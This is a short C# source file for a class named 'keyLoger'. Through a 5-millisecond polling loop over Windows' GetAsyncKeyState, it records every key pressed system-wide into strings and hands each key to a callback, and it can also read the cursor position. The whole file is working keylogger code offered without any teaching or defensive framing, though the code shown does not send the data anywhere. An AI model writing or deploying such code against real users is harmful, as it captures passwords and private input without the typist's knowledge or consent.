using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;

namespace myClass
{
    class keyLoger
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public static implicit operator Point(POINT point)
            {
                return new Point(point.X, point.Y);
            }
        }
        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out POINT lpPoint);

        public static Point mouseLocation()
        {
            POINT lpPoint;
            GetCursorPos(out lpPoint);
            //bool success = User32.GetCursorPos(out lpPoint);
            // if (!success)

            return lpPoint;
        }
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);
        public delegate void myAction(Keys tv);
        
        public string allText = "";
        public string partText = "";
        public int sleep = 5;

        public myAction MyAction;
        private void dif(Keys tv) { }
        public bool run = false;
        
        public keyLoger(myAction write = null)
        {
            if (write == null)
                write = dif;
            MyAction = write;
        }
        public void start()
        {
            partText = "";
            run = true;
            while (run)
            {
                Thread.Sleep(sleep);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        allText += (Keys)i;
                        partText += (Keys)i;
                        MyAction((Keys)i);
                    }
                }
            }
        }
        public void stop()
        {
            run = false;
        }
    }
}
